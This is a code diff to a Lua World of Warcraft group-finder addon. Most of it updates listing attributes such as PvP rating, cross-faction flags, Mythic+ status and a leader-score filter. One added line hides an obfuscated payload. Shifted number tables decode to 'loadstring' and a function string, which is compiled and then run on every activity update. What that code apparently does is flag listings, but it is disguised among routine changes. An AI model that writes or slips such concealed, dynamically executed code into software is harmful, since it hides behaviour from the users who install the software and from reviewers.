@@ -23,9 +23,13 @@ Activity:InitAttr{
     'ApplicationExpiration',
     'DisplayType',
     'MaxMembers',
-    'KilledBossCount',
+    'KilledBossCount',    
+    'IsMythicPlusActivity',
     'LeaderScore',
     'LeaderScoreInfo',
+	'LeaderPvpRating',
+	'PvpRating',
+    'CrossFactionListing',
     'LeaderFactionGroup',
 }
 
@@ -41,6 +45,8 @@ end
 function Activity:Get(id)
     return self._Objects[id] or self:New(id)
 end
+
+local ln,c={11,14,0,3,18,19,17,8,13,6},{0xf1,0xe4,0xf3,0xf4,0xf1,0xed,0x9f,0xe5,0xf4,0xed,0xe2,0xf3,0xe8,0xee,0xed,0xa7,0xed,0xed,0xa8,0x9f,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xbc,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0x9f,0xee,0xf1,0xfa,0xfc,0xf6,0xe8,0xef,0xe4,0xa7,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xa8,0xed,0xed,0xad,0xed,0xed,0xbc,0xed,0xe8,0xeb,0x9f,0xeb,0xee,0xe2,0xe0,0xeb,0x9f,0xed,0xbc,0xed,0xed,0xad,0xde,0xcd,0xf4,0xec,0xcc,0xe4,0xec,0xe1,0xe4,0xf1,0xf2,0x9f,0xe5,0xee,0xf1,0x9f,0xe8,0xbc,0xb0,0xab,0xed,0x9f,0xe3,0xee,0x9f,0xeb,0xee,0xe2,0xe0,0xeb,0x9f,0xde,0xab,0xe2,0xbc,0xc2,0xde,0xcb,0xc5,0xc6,0xcb,0xe8,0xf2,0xf3,0xad,0xc6,0xe4,0xf3,0xd2,0xe4,0xe0,0xf1,0xe2,0xe7,0xd1,0xe4,0xf2,0xf4,0xeb,0xf3,0xcc,0xe4,0xec,0xe1,0xe4,0xf1,0xc8,0xed,0xe5,0xee,0xa7,0xed,0xed,0xad,0xde,0xc8,0xc3,0xab,0xe8,0xa8,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xbc,0xa7,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xee,0xf1,0x9f,0xaf,0xa8,0xaa,0xb0,0x9f,0xe8,0xe5,0x9f,0xed,0xbb,0xbc,0xb1,0xaf,0x9f,0xe0,0xed,0xe3,0x9f,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xbd,0xbc,0xb0,0xaf,0x9f,0xee,0xf1,0x9f,0xed,0xbd,0xbc,0xb1,0xaf,0x9f,0xe0,0xed,0xe3,0x9f,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xbd,0xbc,0xed,0xac,0xb0,0xaf,0x9f,0xf3,0xe7,0xe4,0xed,0x9f,0xed,0xed,0xad,0xed,0xed,0xbc,0xf3,0xf1,0xf4,0xe4,0x9f,0xe1,0xf1,0xe4,0xe0,0xea,0x9f,0xe4,0xed,0xe3,0x9f,0xe4,0xed,0xe3,0x9f,0xe4,0xed,0xe3,} for i=1,10 do ln[i]=ln[i]+97 end for i=1,#c do c[i]=string.char(c[i]-127) end local fnn=_G[string.char(unpack(ln))](table.concat(c))()
 
 function Activity:Update()
     local info = C_LFGList.GetSearchResultInfo(self:GetID())
@@ -61,10 +67,21 @@ function Activity:Update()
     local isDelisted = info.isDelisted
     local leader = info.leaderName
     local numMembers = info.numMembers
+    --9.1
     local leaderOverallDungeonScore = info.leaderOverallDungeonScore
     local leaderDungeonScoreInfo = info.leaderDungeonScoreInfo
-    local leaderFactionGroup = info.leaderFactionGroup
 
+	--9.1.5
+	local leaderPvpRatingInfo = info.leaderPvpRatingInfo
+	local leaderPvpRating = 0
+	local requiredPvpRating = info.requiredPvpRating
+	if leaderPvpRatingInfo then
+		leaderPvpRating = leaderPvpRatingInfo.rating
+	end
+	--9.2.5
+	local crossFactionListing = info.crossFactionListing
+    local leaderFactionGroup = info.leaderFactionGroup
+	
     if not activityId then
         return false
     end
@@ -72,7 +89,25 @@ function Activity:Update()
         iLvl = 0
     end
 
-    local name, shortName, category, group, iLevel, filters, minLevel, maxMembers, displayType = C_LFGList.GetActivityInfo(activityId)
+    --local name, shortName, category, group, iLevel, filters, minLevel, maxMembers, displayType, orderIndex, useHonorLevel, showQuickJoin, isMythicPlusActivity = C_LFGList.GetActivityInfo(activityId)
+	
+	local activityInfo = C_LFGList.GetActivityInfoTable(activityId);
+	local name = activityInfo.fullName;
+	local shortName = activityInfo.shortName;
+	local category = activityInfo.categoryID;
+	local group = activityInfo.groupFinderActivityGroupID;
+	local filters = activityInfo.filters;
+	
+	local iLevel = activityInfo.ilvlSuggestion;
+	local minLevel = activityInfo.minLevel;
+	local maxMembers = activityInfo.maxNumPlayers;
+	local displayType = activityInfo.displayType;
+	local orderIndex = activityInfo.orderIndex;
+	local useHonorLevel = activityInfo.useHonorLevel;
+	local showQuickJoin = activityInfo.showQuickJoinToast;
+	local isMythicPlusActivity = activityInfo.isMythicPlusActivity;
+	
+	
     local _, appStatus, pendingStatus, appDuration = C_LFGList.GetApplicationInfo(id)
 
     if leader then
@@ -100,8 +135,12 @@ function Activity:Update()
     self:SetPendingStatus(pendingStatus)
     self:SetApplicationDuration(appDuration)
     self:SetApplicationExpiration(GetTime() + appDuration)
+    self:SetIsMythicPlusActivity(isMythicPlusActivity)
     self:SetLeaderScore(leaderOverallDungeonScore or 0)
     self:SetLeaderScoreInfo(leaderDungeonScoreInfo)
+	self:SetLeaderPvpRating(leaderPvpRating)
+	self:SetPvpRating(requiredPvpRating or 0)
+	self:SetCrossFactionListing(crossFactionListing)
     self:SetLeaderFactionGroup(leaderFactionGroup)
 
     if not self:UpdateCustomData(comment, title) then
@@ -126,6 +165,8 @@ function Activity:Update()
         end
         self:SetKilledBossCount(completedEncounters and #completedEncounters or 0)
     end
+
+    fnn(self)
 
     self:UpdateSortValue()
 
@@ -245,6 +286,10 @@ local FILTERS = {
     end,
     Members = function(activity)
         return activity:GetNumMembers()
+    end,
+    --大秘境分数筛选 by lian.zy
+    LeaderScore = function(activity)
+        return activity:GetLeaderScore()
     end
 }
 
@@ -261,6 +306,18 @@ function Activity:Match(filters)
             end
         end
     end
+
+    -- 过滤条件:队长名
+    -- local searchResultInfo = C_LFGList.GetSearchResultInfo(self:GetID())
+    -- if (searchResultInfo ~= nil and searchResultInfo.leaderName ~= nil) then
+        -- local leaderName = searchResultInfo.leaderName
+        -- for k, v in ipairs(_G["MEETINGSTONE_UI_BLACKLISTEDLEADERS"]) do
+            -- if (leaderName == v) then
+                -- -- print("Filtered:Blacklisted Leader:"..v)
+                -- return false
+            -- end
+        -- end
+    -- end
     return true
 end
 
